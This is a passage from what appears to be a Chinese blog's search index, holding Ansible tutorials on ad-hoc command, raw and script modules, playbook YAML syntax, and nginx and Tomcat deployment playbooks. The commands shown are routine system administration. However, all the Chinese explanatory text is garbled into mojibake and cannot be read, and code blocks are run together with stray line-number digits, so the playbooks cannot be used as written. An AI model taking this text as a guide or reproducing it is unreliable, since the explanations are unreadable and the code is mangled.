raw -a \"chdir=/tmp/ touch 3.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; ä»ä¸Šé¢æ‰§è¡Œç»“æœæ¥çœ‹ï¼Œä¸‰ä¸ªå‘½ä»¤éƒ½æ‰§è¡ŒæˆåŠŸäº†ã€‚ä¸è¿‡é€šè¿‡åœ¨è¿œç¨‹ä¸»æœºä¸ŠæŸ¥çœ‹ï¼Œå‰ä¸¤ä¸ªæ–‡ä»¶è¢«æˆåŠŸåˆ›å»ºï¼š 12345[root@docker ~]# ansible tomcat_B1 -m command -a \"chdir=/tmp/ ls -lh\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;total 188K-rw-r--r--. 1 root root 0 Sep 5 22:52 1.txt-rw-r--r--. 1 root root 0 Sep 5 22:51 2.txt ä½¿ç”¨rawæ¨¡å—çš„æ‰§è¡Œçš„ç»“æœæ–‡ä»¶ä¹Ÿè¢«æ­£å¸¸åˆ›å»ºäº†ï¼Œä¸è¿‡ä¸æ˜¯åœ¨chdir æŒ‡å®šçš„ç›®å½•ï¼Œè€Œæ˜¯åœ¨å½“å‰æ‰§è¡Œç”¨æˆ·çš„å®¶ç›®å½•ã€‚ 123[root@docker ~]# ansible tomcat_B1 -m raw -a \"ls ~/4.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;/root/4.txt createsä¸removesç¤ºä¾‹ï¼šè¿™é‡Œæˆ‘åœ¨æµ‹è¯•ä¸»æœºä¸Šåˆ›å»º/tmp/server.txtæ–‡ä»¶ï¼Œæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š createsï¼šä¸€ä¸ªæ–‡ä»¶åï¼Œå½“è¯¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¯¥å‘½ä»¤ä¸æ‰§è¡Œ 1234567[root@docker ~]# ansible tomcat_B1 -a \"creates=/tmp/1.txt uptime\" [WARNING]: Failure using method (v2_runner_on_ok) in callback plugin (&lt;ansible.plugins.callback.minimal.CallbackModule object at 0x2093e90&gt;): coercing toUnicode: need string or buffer, bool found[root@docker ~]# ansible tomcat_B1 -a \"removes=/tmp/1.txt uptime\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 22:59:04 up 25 days, 5:10, 1 user, load average: 0.00, 0.00, 0.00 scriptæ¨¡å—ç¤ºä¾‹ï¼š1234567891011121314[root@361way ~]# cat script.sh#!/bin/bashdf -hlifconfigps auxf|grep snmp[root@361way ~]# ansible 10.212.52.252 -m script -a 'scrip.sh'10.212.52.252 | FAILED =&gt; file or module does not exist: /root/scrip.sh[root@361way ~]# ansible 10.212.52.252 -m script -a 'script.sh'10.212.52.252 | success &gt;&gt; &#123; \"changed\": true, \"rc\": 0, \"stderr\": \"OpenSSH_5.3p1, OpenSSL 1.0.1e-fips 11 Feb 2013\\ndebug1: Reading configuration data /etc/ssh/ssh_config\\r\\ndebug1: Applying options for *\\r\\ndebug1: auto-mux: Trying existing master\\r\\nControl socket connect(/root/.ansible/cp/ansible-ssh-10.212.52.252-22-root): Connection refused\\r\\ndebug1: Connecting to 10.212.52.252 [10.212.52.252] port 22.\\r\\ndebug1: fd 3 clearing O_NONBLOCK\\r\\ndebug1: Connection established.\\r\\ndebug1: permanently_set_uid: 0/0\\r\\ndebug1: identity file /root/.ssh/identity type -1\\r\\ndebug1: identity file /root/.ssh/identity-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_rsa type -1\\r\\ndebug1: identity file /root/.ssh/id_rsa-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_dsa type -1\\r\\ndebug1: identity file /root/.ssh/id_dsa-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_ecdsa type -1\\r\\ndebug1: identity file /root/.ssh/id_ecdsa-cert type -1\\r\\ndebug1: Remote protocol version 2.0, remote software version OpenSSH_6.2\\r\\ndebug1: match: OpenSSH_6.2 pat OpenSSH*\\r\\ndebug1: Enabling compatibility mode for protocol 2.0\\r\\ndebug1: Local version string SSH-2.0-OpenSSH_5.3\\r\\ndebug1: SSH2_MSG_KEXINIT sent\\r\\ndebug1: SSH2_MSG_KEXINIT received\\r\\ndebug1: kex: server-&gt;client aes128-ctr hmac-md5 zlib@openssh.com\\r\\ndebug1: kex: client-&gt;server aes128-ctr hmac-md5 zlib@openssh.com\\r\\ndebug1: SSH2_MSG_KEX_DH_GEX_REQUEST(1024&lt;1024&lt;8192) sent\\r\\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP\\r\\ndebug1: SSH2_MSG_KEX_DH_GEX_INIT sent\\r\\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY\\r\\ndebug1: Host '10.212.52.252' is known and matches the RSA host key.\\r\\ndebug1: Found key in /root/.ssh/known_hosts:1\\r\\ndebug1: ssh_rsa_verify: signature correct\\r\\ndebug1: SSH2_MSG_NEWKEYS sent\\r\\ndebug1: expecting SSH2_MSG_NEWKEYS\\r\\ndebug1: SSH2_MSG_NEWKEYS received\\r\\ndebug1: SSH2_MSG_SERVICE_REQUEST sent\\r\\ndebug1: SSH2_MSG_SERVICE_ACCEPT received\\r\\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\\r\\ndebug1: Next authentication method: keyboard-interactive\\r\\ndebug1: Enabling compression at level 6.\\r\\ndebug1: Authentication succeeded (keyboard-interactive).\\r\\ndebug1: setting up multiplex master socket\\r\\nControlSocket /root/.ansible/cp/ansible-ssh-10.212.52.252-22-root already exists, disabling multiplexing\\r\\ndebug1: channel 0: new [client-session]\\r\\ndebug1: Requesting no-more-sessions@openssh.com\\r\\ndebug1: Entering interactive session.\\r\\ndebug1: Sending environment.\\r\\ndebug1: Sending env LANG = en_US.UTF-8\\r\\ndebug1: Sending command: LANG=C LC_CTYPE=C /root/.ansible/tmp/ansible-tmp-1431924855.88-242473611260231/script.sh \\r\\ndebug1: client_input_channel_req: channel 0 rtype exit-status reply 0\\r\\ndebug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0\\r\\ndebug1: channel 0: free: client-session, nchannels 1\\r\\ndebug1: fd 1 clearing O_NONBLOCK\\r\\ndebug1: fd 2 clearing O_NONBLOCK\\r\\nConnection to 10.212.52.252 closed.\\r\\nTransferred: sent 1928, received 3920 bytes, in 0.1 seconds\\r\\nBytes per second: sent 37017.0, received 75262.7\\r\\ndebug1: Exit status 0\\r\\ndebug1: compress outgoing: raw data 537, compressed 375, factor 0.70\\r\\ndebug1: compress incoming: raw data 1837, compressed 1019, factor 0.55\\r\\n\", \"stdout\": \"Filesystem Size Used Avail Use% Mounted on\\r\\n/dev/sda2 9.9G 872M 8.5G 10% /\\r\\nudev 3.9G 128K 3.9G 1% /dev\\r\\ntmpfs 3.9G 76K 3.9G 1% /dev/shm\\r\\n/dev/sda3 5.0G 219M 4.5G 5% /boot\\r\\n/dev/sda8 40G 15G 23G 40% /home\\r\\n/dev/sda9 9.9G 5.2G 4.3G 55% /opt\\r\\n/dev/sda6 5.0G 2.7G 2.1G 57% /tmp\\r\\n/dev/sda5 9.9G 3.4G 6.0G 36% /usr\\r\\n/dev/sda7 9.9G 823M 8.6G 9% /var\\r\\neth0 Link encap:Ethernet HWaddr 00:50:56:A8:65:7E \\r\\n inet addr:10.212.52.252 Bcast:10.212.52.255 Mask:255.255.255.0\\r\\n inet6 addr: fe80::250:56ff:fea8:657e/64 Scope:Link\\r\\n UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\\r\\n RX packets:24112135 errors:0 dropped:792372 overruns:0 frame:0\\r\\n TX packets:10697339 errors:0 dropped:0 overruns:0 carrier:0\\r\\n collisions:0 txqueuelen:1000 \\r\\n RX bytes:17137233328 (16343.3 Mb) TX bytes:13390377826 (12770.0 Mb)\\r\\n\\r\\nlo Link encap:Local Loopback \\r\\n inet addr:127.0.0.1 Mask:255.0.0.0\\r\\n inet6 addr: ::1/128 Scope:Host\\r\\n UP LOOPBACK RUNNING MTU:16436 Metric:1\\r\\n RX packets:3407332 errors:0 dropped:0 overruns:0 frame:0\\r\\n TX packets:3407332 errors:0 dropped:0 overruns:0 carrier:0\\r\\n collisions:0 txqueuelen:0 \\r\\n RX bytes:262675450 (250.5 Mb) TX bytes:262675450 (250.5 Mb)\\r\\n\\r\\nroot 25332 0.0 0.0 4260 568 pts/2 S+ 12:54 0:00 \\\\_ grep snmp\\r\\nroot 24364 0.0 0.0 70416 6696 ? SNl May15 0:22 /usr/sbin/snmpd -r -A -LF i /var/log/net-snmpd.log -p /var/run/snmpd.pid\\r\\n\"&#125; è¾“å‡ºç»“æœå¾ˆå¤šï¼Œçœ‹èµ·æ¥ä¹Ÿå¾ˆä¹±ï¼Œä¸è¿‡æŸ¥ä¸‹stdoutéƒ¨åˆ†ï¼Œè¿™ä¸ªéƒ¨åˆ†æ˜¯å®é™…ä¸Šæ‰§è¡Œåçš„ç»“æœã€‚è¿™é‡Œå¯ä»¥é…åˆç®¡é“ä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥å¦‚ä¸‹ä½¿ç”¨ï¼š ` [root@361way ~]# ansible 10.212.52.252 -m script -a &#39;script.sh&#39; |egrep &#39;&gt;&gt;|stdout&#39;","link":"/2016/03/09/è‡ªåŠ¨åŒ–+Jenkins/Ansible/Ansibleå°ç»“ï¼ˆå››ï¼‰Ad-hocä¸commandsæ¨¡å— /"},{"title":"Ansible-Playbooké«˜çº§è¯­æ³•è¿ç”¨","text":"Ansible å®˜ç½‘å­¦ä¹ ï¼šå…è´¹ä¸‹è½½çš„ANSIBLE WHITEPAPER ansibleé«˜çº§ç™½çš®ä¹¦ Ansibleç®€ä»‹, 111åˆ†é’Ÿçš„å­¦ä¹ è§†é¢‘å®˜ç½‘ Ansibleè‡ªåŠ¨åŒ–å¹³å°æ¼”ç¤º,æ¼”ç¤º æˆ‘åœ¨å®˜ç½‘å­¦ä¹ ğŸ“šä¹¦ç± ï¼Œè¿™é‡Œä¹Ÿæ˜¯å®˜ç½‘æ¨èæˆ‘è´´äº†3æœ¬ï¼Œéœ€è¦è‡ªå·±å»ä¸‹è½½ï¼š Ansible for DevOps, by Jeff GeerlingFREE BOOK SAMPLE Extending Ansible eBook Preview , Extending Ansible ,by Rishabh DasFREE BOOK SAMPLE Mastering Ansible ebook , Mastering Ansible , by Jesse KeatingFREE BOOK SAMPLE è¿™é‡Œæˆ‘ä¸»è¦åº”ç”¨åˆ°Ansible-Playbook æ¯”è¾ƒå¤šï¼Œä¸€å¼€å§‹å­¦ansibleæ˜¯å› ä¸ºè¿ç»´è¿™å—éœ€è¦ç”¨åˆ°è‡ªåŠ¨åŒ–ï¼Œä»¥å‰è‡ªåŠ¨åŒ–å‘å¸ƒç­‰ç­‰éƒ½æ˜¯ç”¨shell,pythonå¤æ‚æ€§çš„å»å®Œæˆï¼Œshellå»å®ç°éƒ¨ç½²ä¸€ä¸ªç¯å¢ƒï¼Œè¦å®Œæˆå¤šå°æœºå™¨ä¹‹å‰é‡‡ç”¨ï¼Œsaltå»å®ç°æ•ˆæœï¼Œå‘ç°åœ¨å…¬å¸ä¸€ä¸ªå¤§å‹çš„æ¶æ„æ¼”å˜saltæ”¯æ’‘ä¸äº†ï¼Œè€Œä¸”éœ€è¦ç½‘ç»œç¨³å®šæ€§é«˜ï¼Œä»–ä»¬çš„è‡ªåŠ¨åŒ–æ§åˆ¶æ˜¯ç”¨agentå»æ§åˆ¶çš„ï¼Œéœ€è¦æ§åˆ¶çš„æœºå™¨éƒ½è¦ä¿®æ”¹å’Œé…ç½®å®‰è£…agent,ansbileå°±ä¸éœ€è¦ã€‚ åœ¨Ansibleä¸­ï¼Œæˆ‘ä»¬å°±å……å½“ç¼–å‰§çš„è§’è‰²ï¼Œäº²è‡ªç¼–å†™å‰§æœ¬ï¼ˆä¸€ç³»åˆ—çš„æœåŠ¡å™¨æ“ä½œï¼‰ï¼Œè®©ä¸€å‡ºå‡ºç²¾å½©çš„æˆå‰§ï¼ˆplayï¼‰å·§å¦™é…åˆï¼Œå®Œæˆå¯¹æœåŠ¡å™¨çš„ä¸€ç³»åˆ—ç²¾ç¡®æ§åˆ¶ã€‚ 1.1 Playbookè¯­æ³•ç®€ä»‹Playbooké‡‡ç”¨ä¸€ç§å¯è¯»æ€§å¾ˆé«˜çš„ä¸”å®¹æ˜“è¢«äººç±»é˜…è¯»çš„è¯­æ³•çš„YAMLè¯­æ³•ç¼–å†™ï¼ŒYAML: &quot;YAML Ain&#39;t a Markup Language&quot;ï¼ˆYAMLä¸æ˜¯ä¸€ç§ç½®æ ‡è¯­è¨€ï¼‰ã€‚è¯¥è¯­è¨€åœ¨è¢«å¼€å‘æ—¶ï¼ŒYAML çš„æ„æ€å…¶å®æ˜¯ï¼šâ€Yet Another Markup Languageâ€ï¼ˆä»æ˜¯ä¸€ç§ç½®æ ‡è¯­è¨€ï¼‰ï¼Œæ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415house: family: name: Doe parents: - John - Jane children: - Paul - Mark - Simone address: number: 34 street: Main Street city: Nowheretown zipcode: 12345 è¿™é‡Œè¯­æ³•æŠ¥é”™æœ‰çš„å¦‚æœæŒ‰shellè„šæœ¬ç›´æ¥å»å†™çš„è¯å°±ä¼šå‡ºé”™ï¼š æŠ¥é”™ï¼š [WARNING]: Consider using unarchive module rather than running unzip 12345678910111213141516171819[root@ansible_01 ~]# ansible-playbook famly.yml---PLAY [all] *********************************************************************TASK [setup] *******************************************************************ok: [192.168.1.209]TASK [copy-war-file] ***********************************************************ok: [192.168.1.209]TASK [unzip war.] **************************************************************changed: [192.168.1.209] [WARNING]: Consider using unarchive module rather than running unzipPLAY RECAP *********************************************************************192.168.1.209 : ok=3 changed=1 unreachable=0 failed=0 åŸè¿™é‡Œfamly.ymlå†™è¿™é‡Œè§£å‹æ­¥éª¤ï¼š 12- name : è§£å‹/root/java_war/api.waråŒ…åœ¨/home/app/newwar/apiç›®å½• shell : unzip -oq &#123;&#123; famly_war &#125;&#125; -d &#123;&#123; app_war &#125;&#125;/webapps/ ä¿®æ”¹ä»¥åï¼š 12- name: unzip war. unarchive: src=/root/java_war/haozhuo-family.war dest=/srv/ ç»è¿‡ä»¥ä¸Šæ›´æ”¹åï¼Œè½¯ä»¶åŒ…å¯ä»¥æ­£å¸¸åœ¨clientè§£å‹ï¼Œä¸å†æŠ¥é”™ã€‚ 2ã€ç‰¹ç‚¹YAMLçš„å¯è¯»æ€§å¥½ YAMLå’Œè„šæœ¬è¯­è¨€çš„äº¤äº’æ€§å¥½ YAMLä½¿ç”¨å®ç°è¯­è¨€çš„æ•°æ®ç±»å‹ YAMLæœ‰ä¸€ä¸ªä¸€è‡´çš„ä¿¡æ¯æ¨¡å‹ YAMLæ˜“äºå®ç° YAMLå¯ä»¥åŸºäºæµæ¥å¤„ç† YAMLè¡¨è¾¾èƒ½åŠ›å¼ºï¼Œæ‰©å±•æ€§å¥½ YAMLçš„è¯­æ³•å’Œå…¶ä»–é«˜é˜¶è¯­è¨€ç±»ä¼¼ï¼Œå¹¶ä¸”å¯ä»¥ç®€å•è¡¨è¾¾æ¸…å•ã€æ•£åˆ—è¡¨ã€æ ‡é‡ç­‰æ•°æ®ç»“æ„ã€‚å…¶ç»“æ„ï¼ˆStructureï¼‰é€šè¿‡ç©ºæ ¼æ¥å±•ç¤ºï¼Œåºåˆ—ï¼ˆSequenceï¼‰é‡Œçš„é¡¹ç”¨â€-â€œæ¥ä»£è¡¨ï¼ŒMapé‡Œçš„é”®å€¼å¯¹ç”¨â€:â€åˆ†éš”ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ã€‚ 123456789101112131415161718- hosts: 10.1.0.1 #å®šä¹‰ä¸»æœº vars: #å®šä¹‰å˜é‡ var1: value var2: value tasks: #å®šä¹‰ä»»åŠ¡ - name: #ä»»åŠ¡åç§°ã€‚ #è¿™é‡Œå°±å¯ä»¥å¼€å§‹ç”¨æ¨¡å—æ¥æ‰§è¡Œå…·ä½“çš„ä»»åŠ¡äº†ã€‚ handlers: #å®šä¹‰è§¦å‘é€šçŸ¥æ‰€ä½œçš„æ“ä½œã€‚é‡Œé¢ä¹Ÿæ˜¯è·Ÿtasksä¸€æ ·ï¼Œç”¨æ¨¡å—å®šä¹‰ä»»åŠ¡ã€‚ - name: remote_user: #è¿œç¨‹ä¸»æœºæ‰§è¡Œä»»åŠ¡æ—¶çš„ç”¨æˆ·ã€‚ä¸€èˆ¬éƒ½æ˜¯rootï¼Œä¸€èˆ¬ä¹Ÿä¸ç”¨æŒ‡å®šã€‚- hosts: web vars: tasks: handlers: remote_user: YAMLæ–‡ä»¶æ‰©å±•åé€šå¸¸ä¸º.yamlï¼Œå¦‚family.yaml 2.playbookçš„åŸºç¡€ç»„ä»¶ï¼š12345678Hostsï¼šè¿è¡ŒæŒ‡å®šä»»åŠ¡çš„ç›®æ ‡ä¸»æœºï¼›remote_userï¼šåœ¨è¿œç¨‹ä¸»æœºä»¥å“ªä¸ªç”¨æˆ·èº«ä»½æ‰§è¡Œï¼› sudo_userï¼šéç®¡ç†å‘˜éœ€è¦æ‹¥æœ‰sudoæƒé™ï¼›tasksï¼šä»»åŠ¡åˆ—è¡¨ æ¨¡å—ï¼Œæ¨¡å—å‚æ•°ï¼š æ ¼å¼ï¼š (1) action: module arguments (2) module: arguments ç¤ºä¾‹1ï¼š vim test.yaml ä¹Ÿå¯ä»¥æ˜¯ .yml 123456789101112131415161718- hosts: tomcat_01 #è¿è¡ŒæŒ‡å®šä»»åŠ¡çš„ç›®æ ‡ä¸»æœºï¼› remote_user: root #åœ¨è¿œç¨‹ä¸»æœºä»¥å“ªä¸ªç”¨æˆ·èº«ä»½æ‰§è¡Œï¼›root tasks: - name: install a group group: name=mygrp system=true - name: install a user user: name=user1 group=mygrp system=true # è¿™é‡Œ-name: graoup: éƒ½è¦å¯¹é½ï¼Œä¸ç„¶ä¼šæç¤ºè¯­æ³•å‡ºé”™ã€‚ - hosts: websrvs remote_user: root tasks: - name: install httpd package yum: name=httpd - name: start httpd service service: name=httpd state=started 3.è¿è¡Œplaybookï¼Œä½¿ç”¨ansible-playbookå‘½ä»¤(1)æ£€æµ‹è¯­æ³• 1ansible-playbook â€“syntax-check /path/to/playbook.yaml (2)æµ‹è¯•è¿è¡Œ 12345ansible-playbook -C /path/to/playbook.yaml --list-hosts --list-tasks --list-tags è¿™é‡Œç®€å•ç»“åˆshellæ¼”å˜å†™å®‰è£…nginx: 123456789101112131415161718- name: copy nginx package copy: src=nginx-1.10.0-1.el7.ngx.x86_64.rpm dest=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm- name: install nginx package yum: name=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm state=present- name: install nginx.conf file template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf tags: ngxconf notify: reload nginx service- name: install default.conf file template: src=default.conf.j2 dest=/etc/nginx/conf.d/default.conf tags: ngxconf notify: reload nginx service- name: start nginx service service: name=nginx enabled=true state=started è‡ªåŠ¨åŒ–éƒ¨ç½²TomcatæœåŠ¡ã€‚ 123456789101112131415161718192021222324252627282930313233343536---- hosts: all environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 vars:#jenkins-æ‰“åŒ…ç›®å½• TESTWAR: /root/java_war/haozhuo-family.war#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®çš„tomcatæ‰€åœ¨çš„ä½ç½® OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT#ç”Ÿäº§ç¯å¢ƒä¸­è€ç‰ˆæœ¬é¡¹ç›®æ‰€åœ¨webappså¤‡ä»½ç›®å½•çš„ä½ç½® backupwebapps: /srv/tomcat/tomcat_family/warbackup#ä»jenkins-æ‰“åŒ…ç¯å¢ƒè·å–çš„æ–°ç‰ˆæœ¬waråŒ…æ‰€åœ¨çš„ä½ç½® NEWWAR: /root/java_war/#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®waråŒ…çš„åå­— WARNAME: haozhuo-family.war#killæœåŠ¡typeè·¯å¾„ DOWNFILE: /srv/tomcat/tomcat_family tasks: - name: copy-war-file copy: src=&#123;&#123; TESTWAR &#125;&#125; dest=&#123;&#123; NEWWAR &#125;&#125; - name: mkdir-bakwar-file file: path=&#123;&#123; backupwebapps &#125;&#125; state=directory owner=tomcat group=tomcat mode=755 - name: bakwar-file shell: \"cp -r &#123;&#123; OLDHOME &#125;&#125; &#123;&#123; backupwebapps &#125;&#125;\" - name: unzip war. unarchive: src=&#123;&#123; NEWWAR &#125;&#125;/&#123;&#123; WARNAME &#125;&#125; dest=&#123;&#123; OLDHOME &#125;&#125; - name: stop-tomcat-service shell: \"ps -ef |grep &#123;&#123; DOWNFILE &#125;&#125; |grep -v grep |awk '&#123;print $2&#125;' |xargs kill -9\" ignore_errors: yes async: 0 - name: start-tomcat-service-nohup shell: chdir=&#123;&#123; DOWNFILE &#125;&#125;/bin nohup ./startup.sh &amp; 123456789101112131415161718192021# tree /etc/ansible/.â”œâ”€â”€ ansible.cfgâ”œâ”€â”€ group_vars # here we assign variables to particular groupsâ”‚ â””â”€â”€ tomcat-servers # this filename must the same with the group in the 'hosts'â”œâ”€â”€ hostsâ”œâ”€â”€ rolesâ”‚ â”œâ”€â”€ selinuxâ”‚ â””â”€â”€ tomcatâ”‚ â”œâ”€â”€ filesâ”‚ â”‚ â””â”€â”€ tomcat-initscript.sh # &lt;-- script files for use with the script resourceâ”‚ â”œâ”€â”€ handlersâ”‚ â”‚ â””â”€â”€ main.yml # &lt;-- handlers fileâ”‚ â”œâ”€â”€ tasksâ”‚ â”‚ â””â”€â”€ main.yml # &lt;-- tasks file can include smaller files if warrantedâ”‚ â””â”€â”€ templates # &lt;-- files for use with the template resourceâ”‚ â”œâ”€â”€ iptables-saveâ”‚ â”œâ”€â”€ server.xmlâ”‚ â””â”€â”€ tomcat-users.xmlâ”œâ”€â”€ app2.retryâ””â”€â”€ app2.yml # master playbook","link":"/2017/02/10/è‡ªåŠ¨åŒ–+Jenkins/Ansible/Ansible-Playbooké«˜çº§è¯­æ³•è¿ç”¨/"},{"title":"Ansible è„šæœ¬(PlaybookåŸºæœ¬è¯­æ³•)è¿œç¨‹æ§åˆ¶","text":"ansible è„šæœ¬(PlaybookåŸºæœ¬è¯­æ³•)è¿œç¨‹æ§åˆ¶PlaybookåŸºæœ¬è¯­æ³• æœ¬èŠ‚åˆ—ä¸¾äº†å†™ç¬¬ä¸€ä¸ªPlaybookï¼Œä½ å¿…é¡»äº†è§£åŸºæœ¬è¯­æ³•ã€‚éšç€ä½ é¢ä¸´çš„æœºå™¨è¶Šå¤šï¼Œé…å±çš„éœ€æ±‚è¶Šå¤æ‚ï¼Œä½ å¯èƒ½éœ€è¦äº†è§£åé¢ä»‹ç»çš„ä¸€äº›ç¨å¾®å¤æ‚é€»è¾‘è¯­å¥ã€‚ æ‰§è¡ŒPlaybookè¯­æ³• è¿™é‡Œå…ˆ vim deploy.yml 12345678910111213141516171819deploy.ymlæ–‡ä»¶---- hosts: tomcat_D1 vars: http_port: 80 max_clients: 200 user: root tasks: - name: ensure apache is at the latest version yum: name=httpd state=latest - name: write the apache config file template: src=/srv/httpd.j2 dest=/etc/httpd.conf notify: - restart apache - name: start httpd service: name=httpd state=started handlers: - name: restart apache service: name=httpd state=restarted æ‰§è¡ŒPlaybookè¯­æ³•1$ ansible-playbook deploy.yml æŸ¥çœ‹è¾“å‡ºçš„ç»†èŠ‚ 1 1ansible-playbook playbook.yml --list-hosts æŸ¥çœ‹è¯¥è„šæœ¬å½±å“å“ªäº›hosts 1ansible-playbook playbook.yml --list-hosts å¹¶è¡Œæ‰§è¡Œè„šæœ¬ 1ansible-playbook playbook.yml -f 10 å®Œæ•´çš„playbookè„šæœ¬ç¤ºä¾‹123456789æœ€åŸºæœ¬çš„playbookè„šæœ¬åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:åœ¨ä»€ä¹ˆæœºå™¨ä¸Šä»¥ä»€ä¹ˆèº«ä»½æ‰§è¡Œhostsusers...æ‰§è¡Œçš„ä»»åŠ¡æ˜¯éƒ½æœ‰ä»€ä¹ˆtaskså–„åçš„ä»»åŠ¡éƒ½æœ‰ä»€ä¹ˆhandlers è¿™é‡Œæˆ‘å†™äº†ä¸ªtomcatå‘å¸ƒï¼Œymlæ–‡ä»¶ï¼šå‚è€ƒï¼š 12345678910111213141516- hosts: tomcat-system_01 environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 tasks: - name : cpfile-system copy : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-system/target/haozhuo-system.war dest=/root/java_war/haozhuo-system.war - name : restart shell : /root/update/system.sh async : 0 - name : shutdown shell : /srv/tomcat/tomcat_system/bin/shutdown.sh async : 0 - name : start shell : chdir=/srv/tomcat/tomcat_system/bin nohup ./startup.sh &amp; async : 0 å‚è€ƒå®˜ç½‘ï¼šhttps://ansible-book.gitbooks.io/ansible-first-book/content/playbookji_ben_yu_fa.html","link":"/2016/03/10/è‡ªåŠ¨åŒ–+Jenkins/Ansible/ansible è„šæœ¬(PlaybookåŸºæœ¬è¯­æ³•)è¿œç¨‹æ§åˆ¶/"},{"title":"Ansibleå°ç»“ï¼ˆäºŒï¼‰ansibleæ¶æ„","text":"Ansible æ˜¯ä¸€ä¸ªæ¨¡å‹é©±åŠ¨çš„é…ç½®ç®¡ç†å™¨ï¼Œæ”¯æŒå¤šèŠ‚ç‚¹å‘å¸ƒã€è¿œç¨‹ä»»åŠ¡æ‰§è¡Œã€‚é»˜è®¤ä½¿ç”¨ SSH è¿›è¡Œè¿œç¨‹è¿æ¥ã€‚æ— éœ€åœ¨è¢«ç®¡ç†èŠ‚ç‚¹ä¸Šå®‰è£…é™„åŠ è½¯ä»¶ï¼Œå¯ä½¿ç”¨å„ç§ç¼–ç¨‹è¯­è¨€è¿›è¡Œæ‰©å±•ã€‚ ä¸Šå›¾ä¸ºansibleçš„åŸºæœ¬æ¶æ„ï¼Œä»ä¸Šå›¾å¯ä»¥äº†è§£åˆ°å…¶ç”±ä»¥ä¸‹éƒ¨åˆ†ç»„æˆï¼š 1234567æ ¸å¿ƒï¼šansibleæ ¸å¿ƒæ¨¡å—ï¼ˆCore Modulesï¼‰ï¼šè¿™äº›éƒ½æ˜¯ansibleè‡ªå¸¦çš„æ¨¡å— æ‰©å±•æ¨¡å—ï¼ˆCustom Modulesï¼‰ï¼šå¦‚æœæ ¸å¿ƒæ¨¡å—ä¸è¶³ä»¥å®ŒæˆæŸç§åŠŸèƒ½ï¼Œå¯ä»¥æ·»åŠ æ‰©å±•æ¨¡å—æ’ä»¶ï¼ˆPluginsï¼‰ï¼šå®Œæˆæ¨¡å—åŠŸèƒ½çš„è¡¥å……å‰§æœ¬ï¼ˆPlaybooksï¼‰ï¼šansibleçš„ä»»åŠ¡é…ç½®æ–‡ä»¶ï¼Œå°†å¤šä¸ªä»»åŠ¡å®šä¹‰åœ¨å‰§æœ¬ä¸­ï¼Œç”±ansibleè‡ªåŠ¨æ‰§è¡Œè¿æ¥æ’ä»¶ï¼ˆConnectior Pluginsï¼‰ï¼šansibleåŸºäºè¿æ¥æ’ä»¶è¿æ¥åˆ°å„ä¸ªä¸»æœºä¸Šï¼Œè™½ç„¶ansibleæ˜¯ä½¿ç”¨sshè¿æ¥åˆ°å„ä¸ªä¸»æœºçš„ï¼Œä½†æ˜¯å®ƒè¿˜æ”¯æŒå…¶ä»–çš„è¿æ¥æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦æœ‰è¿æ¥æ’ä»¶ä¸»æœºç¾¤ï¼ˆHost Inventoryï¼‰ï¼šå®šä¹‰ansibleç®¡ç†çš„ä¸»æœº äºŒã€ansibleå·¥ä½œåŸç† 12345 1ã€ç®¡ç†ç«¯æ”¯æŒlocal ã€sshã€zeromq ä¸‰ç§æ–¹å¼è¿æ¥è¢«ç®¡ç†ç«¯ï¼Œé»˜è®¤ä½¿ç”¨åŸºäºsshçš„è¿æ¥ï¼ï¼ï¼è¿™éƒ¨åˆ†å¯¹åº”åŸºæœ¬æ¶æ„å›¾ä¸­çš„è¿æ¥æ¨¡å—ï¼›2ã€å¯ä»¥æŒ‰åº”ç”¨ç±»å‹ç­‰æ–¹å¼è¿›è¡ŒHost Inventoryï¼ˆä¸»æœºç¾¤ï¼‰åˆ†ç±»ï¼Œç®¡ç†èŠ‚ç‚¹é€šè¿‡å„ç±»æ¨¡å—å®ç°ç›¸åº”çš„æ“ä½œï¼ï¼ï¼å•ä¸ªæ¨¡å—ï¼Œå•æ¡å‘½ä»¤çš„æ‰¹é‡æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç§°ä¹‹ä¸ºad-hocï¼›3ã€ç®¡ç†èŠ‚ç‚¹å¯ä»¥é€šè¿‡playbooks å®ç°å¤šä¸ªtaskçš„é›†åˆå®ç°ä¸€ç±»åŠŸèƒ½ï¼Œå¦‚webæœåŠ¡çš„å®‰è£…éƒ¨ç½²ã€æ•°æ®åº“æœåŠ¡å™¨çš„æ‰¹é‡å¤‡ä»½ç­‰ã€‚playbooksæˆ‘ä»¬å¯ä»¥ç®€å•çš„ç†è§£ä¸ºï¼Œç³»ç»Ÿé€šè¿‡ç»„åˆå¤šæ¡ad-hocæ“ä½œçš„é…ç½®æ–‡ä»¶ ã€‚ ä¸‰ã€ansibleçš„ä¸ƒä¸ªå‘½ä»¤å®‰è£…å®Œansibleåï¼Œå‘ç°ansibleä¸€å…±ä¸ºæˆ‘ä»¬æä¾›äº†ä¸ƒä¸ªæŒ‡ä»¤ï¼š 